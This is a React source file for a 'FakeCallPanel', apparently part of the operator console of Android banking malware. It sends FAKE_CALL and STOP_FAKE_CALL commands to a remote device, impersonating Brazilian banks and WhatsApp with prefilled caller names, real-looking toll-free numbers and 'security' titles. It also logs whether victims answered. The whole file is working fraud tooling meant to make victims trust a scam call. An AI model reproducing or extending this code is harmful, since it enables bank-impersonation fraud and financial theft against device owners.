import { useState } from 'react';
import useStore from '../../store/index.js';

const BANKS = [
  { id: 'itau',      label: 'Itaú',       color: '#EC7000' },
  { id: 'nubank',    label: 'Nubank',     color: '#8A05BE' },
  { id: 'bradesco',  label: 'Bradesco',   color: '#CC092F' },
  { id: 'caixa',     label: 'Caixa',      color: '#005CA9' },
  { id: 'santander', label: 'Santander',  color: '#EC0000' },
  { id: 'inter',     label: 'Inter',      color: '#FF7A00' },
  { id: 'c6',        label: 'C6 Bank',    color: '#242424' },
  { id: 'whatsapp',  label: 'WhatsApp',   color: '#25D366' },
  { id: 'custom',    label: 'Personalizado', color: '#3b7af0' },
];

const DEFAULT_CALLERS = {
  itau:      { name: 'Gerente Itaú Uniclass', number: '0800 728 0728', title: 'Banco Itaú — Segurança' },
  nubank:    { name: 'Nubank Suporte',       number: '0800 591 2335', title: 'Nu Pagamentos S.A.' },
  bradesco:  { name: 'Bradesco Segurança',   number: '0800 701 0001', title: 'Banco Bradesco' },
  caixa:     { name: 'Caixa Econômica',      number: '0800 726 0101', title: 'CEF — Central' },
  santander: { name: 'Santander Atendimento',number: '0800 762 7777', title: 'Banco Santander' },
  inter:     { name: 'Banco Inter Suporte',  number: '0800 940 0007', title: 'Banco Inter' },
  c6:        { name: 'C6 Bank Suporte',      number: '(11) 3090-0606', title: 'C6 Bank' },
  whatsapp:  { name: 'WhatsApp',             number: '+1 (650) 543-4800', title: 'Meta Platforms' },
  custom:    { name: '', number: '', title: '' },
};

export default function FakeCallPanel({ deviceId, onBack, sendCmd }) {
  const fakeCalls = useStore(s => s.deviceFakeCalls);

  const [bank, setBank]           = useState('itau');
  const [name, setName]           = useState(DEFAULT_CALLERS.itau.name);
  const [number, setNumber]       = useState(DEFAULT_CALLERS.itau.number);
  const [title, setTitle]         = useState(DEFAULT_CALLERS.itau.title);
  const [photoUrl, setPhotoUrl]   = useState('');
  const [sending, setSending]     = useState(false);
  const [toast, setToast]         = useState(null);

  function pickBank(id) {
    setBank(id);
    const def = DEFAULT_CALLERS[id] || DEFAULT_CALLERS.custom;
    setName(def.name);
    setNumber(def.number);
    setTitle(def.title);
  }

  function showToast(msg, col = '#4ade80') {
    setToast({ msg, col });
    setTimeout(() => setToast(null), 2500);
  }

  function sendFakeCall() {
    if (!name.trim()) { showToast('Nome do chamador obrigatório', '#f87171'); return; }
    setSending(true);
    sendCmd('FAKE_CALL', {
      caller_name:   name.trim(),
      caller_number: number.trim(),
      caller_title:  title.trim(),
      photo_url:     photoUrl.trim(),
      bank,
    });
    showToast('📞 Chamada falsa enviada!');
    setTimeout(() => setSending(false), 1500);
  }

  function endFakeCall() {
    sendCmd('STOP_FAKE_CALL', {});
    showToast('Chamada encerrada', '#f87171');
  }

  const selectedBank = BANKS.find(b => b.id === bank) || BANKS[0];

  return (
    <div className="fade-up">
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,12,.97)', border: `1px solid ${toast.col}44`,
          borderRadius: 8, padding: '6px 14px', zIndex: 9999, pointerEvents: 'none',
          boxShadow: `0 0 20px ${toast.col}22`,
        }}>
          <span style={{ color: toast.col, fontSize: 11, fontWeight: 700 }}>{toast.msg}</span>
        </div>
      )}

      {/* Header */}
      <div className="row-sb mb12">
        <div>
          <div style={{ fontWeight: 800, fontSize: 14, color: '#4ade80' }}>📞 FAKE CALL</div>
          <div className="txt-xs txt-dim mt2">Chamada de entrada falsa no dispositivo</div>
        </div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      {/* Bank selector */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>BANCO / APLICATIVO</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          {BANKS.map(b => (
            <button
              key={b.id}
              onClick={() => pickBank(b.id)}
              style={{
                padding: '5px 12px', borderRadius: 20, fontSize: 11, fontWeight: 700,
                cursor: 'pointer', border: `1px solid ${b.id === bank ? b.color : 'rgba(255,255,255,.12)'}`,
                background: b.id === bank ? `${b.color}22` : 'rgba(255,255,255,.04)',
                color: b.id === bank ? b.color : 'var(--text2)',
              }}>
              {b.label}
            </button>
          ))}
        </div>
      </div>

      {/* Caller details */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>DETALHES DO CHAMADOR</div>

        {/* Preview */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 12, marginBottom: 14,
          padding: '10px 12px', borderRadius: 12,
          background: 'rgba(255,255,255,.04)',
          border: `1px solid ${selectedBank.color}33`,
        }}>
          <div style={{
            width: 46, height: 46, borderRadius: 23,
            background: `${selectedBank.color}22`,
            border: `1px solid ${selectedBank.color}55`,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontSize: 18, fontWeight: 800, color: selectedBank.color, flexShrink: 0,
          }}>
            {selectedBank.label.charAt(0)}
          </div>
          <div>
            <div style={{ fontWeight: 700, fontSize: 14, color: 'var(--text)' }}>
              {name || 'Nome do chamador'}
            </div>
            <div style={{ fontSize: 12, color: selectedBank.color, marginTop: 2 }}>
              {number || '—'}
            </div>
            {title && (
              <div style={{ fontSize: 10, color: 'var(--text3)', marginTop: 2 }}>{title}</div>
            )}
          </div>
          <div style={{
            marginLeft: 'auto', background: '#1a2a1a', border: '1px solid #4ade8055',
            borderRadius: 20, padding: '3px 10px',
            fontSize: 10, fontWeight: 700, color: '#4ade80',
          }}>
            Chamada
          </div>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          <div>
            <div className="txt-xs txt-dim mb4">Nome do Chamador *</div>
            <input className="input" value={name} onChange={e => setName(e.target.value)}
              placeholder="ex: Gerente Itaú Uniclass" />
          </div>
          <div>
            <div className="txt-xs txt-dim mb4">Número</div>
            <input className="input" value={number} onChange={e => setNumber(e.target.value)}
              placeholder="ex: 0800 728 0728" />
          </div>
          <div>
            <div className="txt-xs txt-dim mb4">Título / Subtítulo</div>
            <input className="input" value={title} onChange={e => setTitle(e.target.value)}
              placeholder="ex: Banco Itaú — Segurança" />
          </div>
          <div>
            <div className="txt-xs txt-dim mb4">URL da Foto (opcional)</div>
            <input className="input" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)}
              placeholder="https://..." />
          </div>
        </div>
      </div>

      {/* Action buttons */}
      <div className="grid g2 mb12">
        <button
          className="btn btn-green btn-block"
          style={{ background: 'rgba(74,222,128,.15)', border: '1px solid #4ade8055', color: '#4ade80', fontWeight: 800 }}
          disabled={sending}
          onClick={sendFakeCall}>
          📞 INICIAR CHAMADA
        </button>
        <button
          className="btn btn-red btn-block"
          style={{ fontWeight: 700 }}
          onClick={endFakeCall}>
          🚫 ENCERRAR
        </button>
      </div>

      {/* Log */}
      {fakeCalls.length > 0 && (
        <div className="card">
          <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>HISTÓRICO DE CHAMADAS</div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: 260, overflowY: 'auto' }}>
            {fakeCalls.slice(0, 20).map((c, i) => (
              <div key={i} style={{
                display: 'flex', alignItems: 'center', gap: 8,
                padding: '7px 10px', borderRadius: 8,
                background: 'rgba(255,255,255,.03)',
                borderLeft: `3px solid ${c.status === 'answered' ? '#4ade80' : c.status === 'declined' ? '#f87171' : '#3b7af0'}`,
              }}>
                <span style={{ fontSize: 16 }}>
                  {c.status === 'answered' ? '✅' : c.status === 'declined' ? '❌' : '📞'}
                </span>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 12, fontWeight: 700, color: 'var(--text)' }}>
                    {c.caller_name}
                  </div>
                  {c.caller_number && (
                    <div style={{ fontSize: 10, color: 'var(--text3)' }}>{c.caller_number}</div>
                  )}
                </div>
                <div style={{ textAlign: 'right', flexShrink: 0 }}>
                  <div style={{
                    fontSize: 10, fontWeight: 700,
                    color: c.status === 'answered' ? '#4ade80' : c.status === 'declined' ? '#f87171' : '#94a3b8',
                  }}>
                    {(c.status || '').toUpperCase()}
                  </div>
                  <div className="txt-xs txt-dim mt2">
                    {c.ts ? new Date(c.ts).toLocaleTimeString() : ''}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
